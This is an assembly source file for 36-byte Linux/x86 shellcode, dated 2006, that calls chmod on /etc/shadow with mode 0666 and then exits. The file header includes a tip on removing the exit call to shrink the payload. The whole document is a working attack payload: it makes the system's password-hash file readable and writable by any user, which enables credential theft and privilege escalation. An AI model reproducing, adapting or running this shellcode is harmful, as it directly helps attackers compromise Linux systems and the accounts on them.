; By Kris Katterjohn 8/29/2006
;  36 byte shellcode to chmod("/etc/shadow", 0666) and exit for Linux/x86
;  To remove exit(): Remove the last 5 bytes (0x6a - 0x80)
 
 
 
  section .text
 
       global _start
 
  _start:
       xor edx, edx
 
       push byte 15
       pop eax
       push edx
       push byte 0x77
       push word 0x6f64
       push 0x6168732f
       push 0x6374652f
       mov ebx, esp
       push word 0666Q
       pop ecx
       int 0x80
 
       push byte 1
       pop eax
       int 0x80
 
